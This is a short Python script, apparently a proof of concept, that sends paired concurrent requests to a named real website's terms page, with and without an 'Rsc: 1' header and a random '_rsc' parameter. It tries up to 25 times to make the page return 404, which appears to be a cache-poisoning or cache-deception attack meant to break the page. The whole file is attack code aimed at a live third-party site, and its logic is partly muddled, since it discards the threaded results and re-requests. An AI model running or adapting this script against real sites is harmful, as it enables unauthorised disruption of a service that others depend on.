import requests
import random
import string
import threading
import time

def make_request(url, headers=None):
    try:
        response = requests.get(url, headers=headers)
        return response.status_code
    except requests.RequestException as e:
        print(f"An error occurred: {e}")
        return None

def generate_random_value(length=5):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def check_status():
    for _ in range(25):
        random_value = generate_random_value()
        url = f"https://www.biltrewards.com/terms?_rsc={random_value}"

        headers_with_rsc = {'Rsc': '1'}
        headers_without_rsc = {}

        # Create threads for simultaneous requests
        thread_with_rsc = threading.Thread(target=make_request, args=(url, headers_with_rsc))
        thread_without_rsc = threading.Thread(target=make_request, args=(url, headers_without_rsc))

        # Start the threads
        thread_with_rsc.start()
        thread_without_rsc.start()

        # Wait for both threads to complete
        thread_with_rsc.join()
        thread_without_rsc.join()

        # Check the status codes
        status_with_rsc = make_request(url, headers_with_rsc)
        status_without_rsc = make_request(url, headers_without_rsc)

        if status_with_rsc == 404 and status_without_rsc == 404:
            print("Successfully done the task")
            return

        # Wait a bit before the next attempt
        time.sleep(1)

    print("Completed 25 attempts without success")

if __name__ == "__main__":
    check_status()
